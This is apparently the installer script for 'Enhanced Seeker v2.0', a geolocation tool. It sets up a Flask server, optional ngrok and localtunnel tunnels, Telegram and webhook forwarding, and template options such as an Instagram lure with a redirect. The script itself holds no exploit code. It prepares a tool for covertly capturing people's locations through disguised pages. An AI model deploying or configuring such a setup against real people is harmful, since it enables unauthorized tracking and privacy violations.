#!/bin/bash

# Enhanced Seeker v2.0 Installation Script
# Educational/Research Tool - Use Responsibly

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logo
echo -e "${GREEN}"
echo "╔═══════════════════════════════════════╗"
echo "║          Enhanced Seeker v2.0         ║"
echo "║     Advanced Geolocation Tool         ║"
echo "║                                       ║"
echo "║  Educational/Research Use Only        ║"
echo "║  Use Responsibly and Ethically        ║"
echo "╚═══════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${BLUE}[INFO]${NC} Starting Enhanced Seeker installation..."

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   echo -e "${YELLOW}[WARNING]${NC} Running as root. Consider running as a regular user for security."
   read -p "Continue anyway? (y/n): " -n 1 -r
   echo
   if [[ ! $REPLY =~ ^[Yy]$ ]]; then
       exit 1
   fi
fi

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to print status
print_status() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Detect OS
OS="unknown"
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "cygwin" ]]; then
    OS="windows"
fi

print_info "Detected OS: $OS"

# Check Python installation
print_info "Checking Python installation..."
if command_exists python3; then
    PYTHON_VERSION=$(python3 --version 2>&1 | awk '{print $2}')
    print_status "Python3 found: $PYTHON_VERSION"
    
    # Check if Python version is 3.7 or higher
    if python3 -c "import sys; exit(0 if sys.version_info >= (3, 7) else 1)"; then
        print_status "Python version is compatible"
    else
        print_error "Python 3.7 or higher is required"
        exit 1
    fi
else
    print_error "Python3 is not installed"
    
    if [[ "$OS" == "linux" ]]; then
        print_info "Installing Python3..."
        if command_exists apt-get; then
            sudo apt-get update
            sudo apt-get install -y python3 python3-pip python3-venv
        elif command_exists yum; then
            sudo yum install -y python3 python3-pip
        elif command_exists pacman; then
            sudo pacman -S python python-pip
        else
            print_error "Package manager not supported. Please install Python3 manually."
            exit 1
        fi
    elif [[ "$OS" == "macos" ]]; then
        if command_exists brew; then
            print_info "Installing Python3 via Homebrew..."
            brew install python3
        else
            print_error "Homebrew not found. Please install Python3 manually from https://python.org"
            exit 1
        fi
    else
        print_error "Please install Python3 manually"
        exit 1
    fi
fi

# Check pip installation
print_info "Checking pip installation..."
if command_exists pip3; then
    print_status "pip3 found"
else
    print_info "Installing pip3..."
    if [[ "$OS" == "linux" ]]; then
        if command_exists apt-get; then
            sudo apt-get install -y python3-pip
        elif command_exists yum; then
            sudo yum install -y python3-pip
        fi
    else
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
        python3 get-pip.py --user
        rm get-pip.py
    fi
fi

# Install required system packages
print_info "Installing system dependencies..."
if [[ "$OS" == "linux" ]]; then
    if command_exists apt-get; then
        sudo apt-get update
        sudo apt-get install -y curl wget git sqlite3 openssh-client
    elif command_exists yum; then
        sudo yum install -y curl wget git sqlite openssh-clients
    elif command_exists pacman; then
        sudo pacman -S curl wget git sqlite openssh
    fi
elif [[ "$OS" == "macos" ]]; then
    if command_exists brew; then
        brew install curl wget git sqlite
    fi
fi

# Create virtual environment (optional but recommended)
read -p "Create Python virtual environment? (recommended) (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    print_info "Creating virtual environment..."
    python3 -m venv venv
    source venv/bin/activate
    print_status "Virtual environment created and activated"
fi

# Install Python dependencies
print_info "Installing Python dependencies..."
pip3 install flask flask-socketio requests psutil user-agents

# Verify installation
print_info "Verifying installation..."
python3 -c "import flask, flask_socketio, requests, psutil, user_agents; print('All dependencies imported successfully')" || {
    print_error "Failed to import dependencies"
    exit 1
}

print_status "Python dependencies installed successfully"

# Initialize database
print_info "Initializing database..."
python3 -c "
from database import Database
db = Database()
db.init_db()
print('Database initialized successfully')
" || {
    print_error "Failed to initialize database"
    exit 1
}

print_status "Database initialized"

# Set up permissions
print_info "Setting up file permissions..."
chmod +x seeker.py
chmod +x app.py
print_status "File permissions set"

# Optional: Install tunnel services
echo
print_info "Optional tunnel services installation:"

# ngrok
read -p "Install ngrok? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    print_info "Installing ngrok..."
    if [[ "$OS" == "linux" ]]; then
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip -q ngrok-stable-linux-amd64.zip
        sudo mv ngrok /usr/local/bin/
        rm ngrok-stable-linux-amd64.zip
    elif [[ "$OS" == "macos" ]]; then
        if command_exists brew; then
            brew install ngrok/ngrok/ngrok
        else
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip
            unzip -q ngrok-stable-darwin-amd64.zip
            sudo mv ngrok /usr/local/bin/
            rm ngrok-stable-darwin-amd64.zip
        fi
    fi
    
    if command_exists ngrok; then
        print_status "ngrok installed successfully"
        print_info "Get your auth token from https://dashboard.ngrok.com/get-started/your-authtoken"
        print_info "Then run: ngrok authtoken YOUR_TOKEN"
    else
        print_warning "ngrok installation may have failed"
    fi
fi

# localtunnel
read -p "Install localtunnel? (requires Node.js) (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    if command_exists npm; then
        print_info "Installing localtunnel..."
        npm install -g localtunnel
        print_status "localtunnel installed successfully"
    else
        print_warning "Node.js/npm not found. Install Node.js first to use localtunnel"
    fi
fi

# Create configuration file
print_info "Creating default configuration..."
cat > .env << EOL
# Enhanced Seeker Configuration
# Copy this file and customize as needed

# Server Configuration
HOST=0.0.0.0
PORT=5000
DEBUG=False

# Database Configuration
DATABASE_PATH=seeker_data.db

# Tunnel Configuration (optional)
NGROK_AUTH_TOKEN=
SERVEO_SUBDOMAIN=

# Webhook Configuration (optional)
WEBHOOK_URL=
WEBHOOK_SECRET=

# Telegram Integration (optional)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Template Customization (optional)
CUSTOM_TITLE=
CUSTOM_IMAGE=
CUSTOM_REDIRECT=https://google.com

# Security Settings
RATE_LIMIT=100
RETAIN_DATA_DAYS=30
EOL

print_status "Configuration file created (.env)"

# Create startup script
print_info "Creating startup script..."
cat > start.sh << 'EOL'
#!/bin/bash
# Enhanced Seeker Startup Script

# Activate virtual environment if it exists
if [ -d "venv" ]; then
    source venv/bin/activate
    echo "Virtual environment activated"
fi

# Load environment variables
if [ -f ".env" ]; then
    export $(cat .env | grep -v '^#' | xargs)
    echo "Environment variables loaded"
fi

# Start Enhanced Seeker
echo "Starting Enhanced Seeker..."
echo "Dashboard will be available at: http://localhost:${PORT:-5000}"
echo "Press Ctrl+C to stop"
echo

python3 app.py
EOL

chmod +x start.sh
print_status "Startup script created (start.sh)"

# Security check
print_info "Performing security check..."
if [[ -w "." ]]; then
    print_status "Directory permissions OK"
else
    print_warning "Directory is not writable"
fi

# Final setup
echo
echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    Installation Complete!                  ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
echo

print_status "Enhanced Seeker v2.0 has been installed successfully!"
echo
print_info "To start Enhanced Seeker:"
echo "  1. Run: ./start.sh"
echo "  2. Or run: python3 app.py"
echo "  3. Open browser to: http://localhost:5000"
echo
print_info "Command line usage:"
echo "  python3 seeker.py -t instagram -p 5000"
echo "  python3 seeker.py --help"
echo
print_info "Configuration:"
echo "  Edit .env file to customize settings"
echo "  Set up tunnel services (ngrok, serveo, localtunnel)"
echo "  Configure webhooks and Telegram notifications"
echo

echo -e "${YELLOW}⚠️  IMPORTANT LEGAL NOTICE ⚠️${NC}"
echo
echo -e "${RED}This tool is for educational and authorized security testing only.${NC}"
echo -e "${RED}Unauthorized use for malicious purposes is illegal and unethical.${NC}"
echo
echo -e "${YELLOW}Acceptable Use:${NC}"
echo "  ✅ Educational research and learning"
echo "  ✅ Authorized penetration testing"
echo "  ✅ Security awareness demonstrations"
echo "  ✅ Academic research with proper approval"
echo
echo -e "${YELLOW}Prohibited Use:${NC}"
echo "  ❌ Unauthorized tracking of individuals"
echo "  ❌ Malicious data collection"
echo "  ❌ Violation of privacy laws"
echo "  ❌ Any illegal activities"
echo
print_info "By using this tool, you agree to use it responsibly and ethically."
print_info "You are solely responsible for ensuring you have proper authorization."
echo

# Ask to start immediately
read -p "Start Enhanced Seeker now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    print_info "Starting Enhanced Seeker..."
    ./start.sh
fi

print_status "Installation script completed successfully!"
